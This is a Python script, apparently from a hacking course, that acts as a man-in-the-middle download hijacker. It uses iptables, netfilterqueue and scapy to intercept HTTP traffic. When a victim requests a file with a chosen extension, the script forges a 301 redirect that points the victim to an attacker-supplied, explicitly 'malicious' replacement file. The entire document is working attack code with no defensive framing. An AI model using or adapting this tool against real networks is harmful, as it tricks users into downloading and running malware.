#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse


# get arguments from command line
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e","--extension",dest="extension",help="File extension string to match for replacement. Ex '.exe' or '.dmg', etc ...")
    parser.add_option("-u","--url",dest="url",help="Url location for replacement file.")
    (options, arguments) = parser.parse_args()
    if not options.extension:
        parser.error("[-] Please enter a file extension to search for, use --help for more info")
    if not options.url:
        parser.error("[-] Please enter a url for a file replacement, use --help for more info")
    return options

# tell the target that the file has moved and enter our own malicious file
def set_load(packet, loadurl):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation:" + loadurl + "\n\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# process the packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # does it have a raw (data) layer?
    if scapy_packet.haslayer(scapy.Raw):
        # is it http ?
        if scapy_packet[scapy.TCP].dport ==80:
            # does it have our target extension ?
            if extension in scapy_packet[scapy.Raw].load and url not in scapy_packet[scapy.Raw].load:
                # requesting a file that matches our target
                print("[+] HTTP Request for :" + extension)
                print("\033[1;31;47m[+] Found extension: " + extension + "\x1b[0m")
                # add the ack to our ack_list so we know which response is the one to spoof
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # it is the response!
        elif scapy_packet[scapy.TCP].sport == 80:
            # if it is in our ack list then replace the file with our malicious one
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] HTTP Response")
                print("[+] Sending replacement file: " + url)
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(scapy_packet,url)
                packet.set_payload(str(modified_packet))
    packet.accept()

# initialize global variable and get command line args
ack_list = []

options = get_arguments()
extension = options.extension
url = options.url

# run main program
try:
    print("[+] Creating IP tables")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
    # local testing
    #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
    #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    # local testing
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Detected CTRL+C ")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush",shell=True)
    print("[+] Quitting")


